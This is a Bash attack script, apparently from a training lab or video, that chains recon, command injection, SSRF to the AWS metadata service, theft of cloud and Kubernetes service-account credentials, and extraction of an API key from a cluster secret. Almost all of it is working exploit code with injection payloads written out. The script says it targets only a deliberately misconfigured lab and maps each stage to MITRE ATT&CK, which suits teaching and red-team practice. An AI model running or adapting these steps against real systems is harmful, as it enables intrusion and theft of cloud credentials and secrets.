#!/usr/bin/env bash
#
# killchain.sh — the full attack, scripted. This is the Python/Bash automation
# beat of the video: one runner that chains recon through exfiltration. It only
# touches the lab you deployed, and only works because the lab is deliberately
# misconfigured. Run it from the attack box after `make deploy`.
#
# Each stage prints the video analogue and the MITRE ATT&CK for Containers id it
# maps to. See ./README.md for the full mapping table.
#
# Usage:
#   APP_URL=http://<loadbalancer-hostname> ./killchain.sh
#
# Requires: curl, jq, kubectl, aws. APP_URL is the summarizer's LoadBalancer.

set -euo pipefail

APP_URL="${APP_URL:?set APP_URL to the summarizer LoadBalancer URL}"
IMDS="http://169.254.169.254/latest/meta-data/iam/security-credentials"

line() { printf '\n=== %s ===\n' "$1"; }

line "STAGE 0  Recon  (video: Nmap + Dirsearch/WhatWeb | ATT&CK T1595 Active Scanning)"
# FastAPI serves its own schema, the directory-enumeration analogue: the attack
# surface is discoverable without a wordlist.
curl -fsS "$APP_URL/healthz" | jq .
echo "discovered routes:"
curl -fsS "$APP_URL/openapi.json" | jq -r '.paths | keys[]'

line "STAGE 1  Foothold via RCE  (video: exploit for reverse shell | ATT&CK T1190 Exploit Public-Facing App)"
# Command injection in /tools/diagnose: chain a second command after the host.
echo "proving code execution (id):"
curl -fsS "$APP_URL/tools/diagnose?host=127.0.0.1%3Bid" | jq -r '.stdout'

line "STAGE 2  SSRF to IMDS, steal node credentials  (video: Burp intercept/modify | ATT&CK T1552.005)"
ROLE=$(curl -fsS "$APP_URL/summarize" -H 'content-type: application/json' \
  -d "{\"url\":\"$IMDS/\"}" | jq -r '.body' | head -1)
echo "node instance-profile role: $ROLE"
CREDS=$(curl -fsS "$APP_URL/summarize" -H 'content-type: application/json' \
  -d "{\"url\":\"$IMDS/$ROLE\"}" | jq -r '.body')
AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
echo "assumed node identity:"
aws sts get-caller-identity

line "STAGE 3  Lateral movement with stolen creds  (video: pivot | ATT&CK T1078.004 Valid Cloud Accounts)"
# A web app's node role has no business reading a prod database credential, yet
# the broad policy lets it. Read the decoy by name (the policy is scoped to the
# lab's own namespace so this is safe to run in a shared account).
echo "reading the prod/db-backup credential with the stolen node identity:"
aws secretsmanager get-secret-value \
  --secret-id "${CLUSTER_NAME:-attack-range}/prod/db-backup" \
  --query SecretString --output text | jq .
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

line "STAGE 4  Privilege escalation with the pod's SA token  (video: privesc to root | ATT&CK T1134)"
# RCE already gives us the auto-mounted cluster-admin token. Pull it out and
# drive the public API endpoint as cluster-admin.
TOKEN=$(curl -fsS "$APP_URL/tools/diagnose?host=127.0.0.1%3Bcat%20%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken" | jq -r '.stdout')
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
echo "listing secrets in every namespace as the pod's identity:"
kubectl --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
  get secrets --all-namespaces | head

line "STAGE 5  Trophy: exfiltrate the Claude API key  (video: capture the flag | ATT&CK T1552.001)"
KEY=$(kubectl --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
  -n summarizer get secret summarizer-key -o jsonpath='{.data.ANTHROPIC_API_KEY}' | base64 -d)
echo "stolen ANTHROPIC_API_KEY (first 12 chars): ${KEY:0:12}..."
echo
echo "Kill chain complete. Revoke this key now, then run the blue-team overlay."
